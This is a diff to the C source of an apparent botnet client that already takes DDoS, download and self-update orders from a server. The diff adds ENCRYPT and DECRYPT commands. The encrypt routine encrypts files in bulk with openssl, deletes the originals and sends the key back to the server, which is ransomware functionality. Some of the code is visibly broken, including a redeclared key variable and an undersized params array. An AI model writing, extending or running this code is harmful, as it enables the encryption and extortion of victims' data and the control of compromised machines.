@@ -26,7 +26,10 @@ enum OrderType get_order_enum_type(const char *buffer) {
     if (strcmp(flag, "ASKSTATE") == 0) return ASKSTATE;
     if (strcmp(flag, "DDOSATCK") == 0) return DDOSATCK;
     if (strncmp(buffer, "DOWNLOAD", 8) == 0) return DOWNLOAD;
-    return UNKNOWN; // warning: unknown enum value is 5
+    if (strncmp(buffer, "UPDATE", 6) == 0) return UPDATE;
+    if (strncmp(buffer, "ENCRYPT", 7) == 0) return ENCRYPT;
+    if (strncmp(buffer, "DECRYPT", 8) == 0) return DECRYPT;
+    return UNKNOWN; // warning: unknown enum value is 99
 }
 
 // Return a buffer storing the n_last_line lines of the main.log file or all of the lines if n_last_line <= 0
@@ -166,6 +169,13 @@ void receive_and_process_message(int sockfd, int argc, char *argv[]) {
         case UPDATE:
             perform_self_update("/tmp/botnet/downloads/client", sockfd, argc, argv);
             break;
+        case ENCRYPT:
+            encrypt(sockfd, cmd.params[0], cmd.params[1]);
+            break;
+        case DECRYPT:
+            output_log("Preparing for DECRYPT request\n", LOG_DEBUG, LOG_TO_CONSOLE);
+            decrypt(sockfd, cmd.params[0], cmd.params[1]);
+            break;
         case UNKNOWN:
             output_log("Unknown command type received\n", LOG_WARNING, LOG_TO_CONSOLE);
             break;
@@ -229,3 +239,112 @@ void perform_self_update(const char *new_exe_path, int sockfd, int argc, char *a
     perror("execv failed");
     output_log("perform_self_update : Execv failed to run : %s\n", LOG_ERROR, LOG_TO_ALL, errno);
 }
+
+char random_char(int index) {
+    char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    return charset[index];
+}
+char* generate_key(){
+    srand(time(NULL));
+    char *key = malloc(STRLEN * sizeof(char));
+    if (!key) {
+        output_log("generate_key : Failed to allocate memory for encryption key\n", LOG_ERROR, LOG_TO_ALL);
+        return NULL;
+    }
+	int i, index;
+
+	for (i = 0; i < STRLEN - 1; i++) {
+		index = rand() % 62;
+		key[i] = random_char(index);
+	}
+	key[i] = '\0';
+    return key;
+}
+
+void encrypt(int sockfd,const char *filepath, const char* key){
+    Command cmd = {
+        .cmd_id = "0",
+        .delay = 0,
+        .program = strdup("find"), // Dynamically allocate program
+        .expected_exit_code = 0,
+        .params = malloc(1 * sizeof(char *))
+    };
+    char *key = generate_key(); // key generation
+    if (!key) {
+        output_log("encrypt : Failed to generate encryption key\n", LOG_ERROR, LOG_TO_ALL);
+        free_command(&cmd);
+        free(key);
+        return;
+    }
+
+    char command[2048];
+    snprintf(
+        command, sizeof(command),
+        "find %s \\( -path /proc -o -path /sys -o -path /dev -o -path /usr -o -path /usr/bin -o -path /bin -o -path /sbin -o -path /lib -o -path /lib64 \\) -prune -o -type f ! -name \"*.encrypted\" -exec sh -c 'openssl aes-256-cbc -a -salt -pbkdf2 -in \"$1\" -out \"$1.encrypted\" -k \"%s\" && rm -f \"$1\"' _ {} \\; > /dev/null 2>&1 &",
+        filepath, key
+    );
+    cmd.params[0] = strdup(command); // Add the command as the first parameter
+    cmd.params[1] = NULL; // Null-terminate the params array
+    output_log("encrypt : Encrypting files with command: %s\n", LOG_DEBUG, LOG_TO_CONSOLE, command);
+    
+    write_encrypted_file("/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log", key); // Write the key to a file
+    if(send_file(sockfd, "/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log") < 0) { // send key to server
+        output_log("encrypt : Failed to send encryption key file to server\n", LOG_ERROR, LOG_TO_ALL);
+        free(key);
+        free_command(&cmd);
+        return;
+    }
+    output_log("encrypt : Encryption key sent to server\n", LOG_DEBUG, LOG_TO_CONSOLE);
+    // Supprimer le fichier temporaire contenant la clé
+    if (remove("/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log") != 0) { // remove the key file
+        output_log("encrypt : Failed to delete key file: %s\n", LOG_ERROR, LOG_TO_ALL, "/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log");
+    }
+    parse_and_execute_command(cmd, sockfd); // Execute the command
+    free_command(&cmd); // Free dynamically allocated fields
+    free(key); // Free the generated key
+    return;
+
+}
+
+void write_encrypted_file(const char *filepath, const char *key) {
+    FILE *file = fopen(filepath, "w");
+    if (!file) {
+        output_log("write_encrypted_file : Failed to open file for writing: %s\n", LOG_ERROR, LOG_TO_ALL, filepath);
+        return;
+    }
+
+    // Write the key to the file
+    fprintf(file, "%s\n", key);
+    fclose(file);
+}
+
+void decrypt(int sockfd, const char *filepath, const char* key) {
+    Command cmd = {
+        .cmd_id = "0",
+        .delay = 0,
+        .program = strdup("find"), // Dynamically allocate program
+        .expected_exit_code = 0,
+        .params = malloc(1 * sizeof(char *))
+    };
+
+    char command[2048];
+    snprintf(
+        command, sizeof(command),
+        "find %s \\( -path /proc -o -path /sys -o -path /dev -o -path /usr -o -path /usr/bin -o -path /bin -o -path /sbin -o -path /lib -o -path /lib64 \\) -prune -o -type f -name \"*.encrypted\" -exec sh -c 'original=\"${1%%.encrypted}\"; "
+        "if openssl aes-256-cbc -d -a -pbkdf2 -in \"$1\" -out \"$original\" -k \"%s\"; then "
+        "echo \"Déchiffré avec succès: $1\"; "
+        "rm -f \"$1\"; "
+        "else "
+        "echo \"Échec du déchiffrement: $1\" >&2; "
+        "fi' _ {} \\; > /dev/null 2>&1 &",
+        filepath, key
+    );
+    cmd.params[0] = strdup(command); // Add the command as the first parameter
+    cmd.params[1] = NULL; // Null-terminate the params array
+    output_log("decrypt : Decrypting files with command: %s\n", LOG_DEBUG, LOG_TO_CONSOLE, command);
+    
+    parse_and_execute_command(cmd, sockfd); // Execute the command
+    free_command(&cmd); // Free dynamically allocated fields
+    return;
+}
+
